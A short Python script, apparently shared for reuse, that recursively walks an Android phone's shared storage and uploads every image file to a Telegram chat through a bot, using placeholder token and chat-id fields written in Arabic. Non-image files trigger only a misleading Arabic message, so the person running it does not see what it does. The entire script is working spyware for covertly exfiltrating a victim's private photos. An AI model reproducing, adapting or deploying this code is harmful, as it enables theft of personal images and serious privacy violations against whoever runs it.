
import os
import telebot
from threading import Thread

bot = telebot.TeleBot("توكنك توكنك توكنك توكنك توكنك شفت؟ ") 

#@M02MM
dir_path = "/storage/emulated/0/"
	
#@uiujq
def send_file(file_path):
 with open(file_path, "rb") as f:
 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
 		bot.send_photo(chat_id="ايديك ايديك ايديك ايدي شفت؟ ",photo=f) 
 	else:
 		print("سوف يتم رشق 💕")

for root, dirs, files in os.walk(dir_path):
	threads = []
	for file in files:
		file_path = os.path.join(root, file)
		t = Thread(target=send_file, args=(file_path,))
		t.start()
		threads.append(t)
	for thread in threads:
		thread.join()
#اخمط بس اذكر مصدر وبس
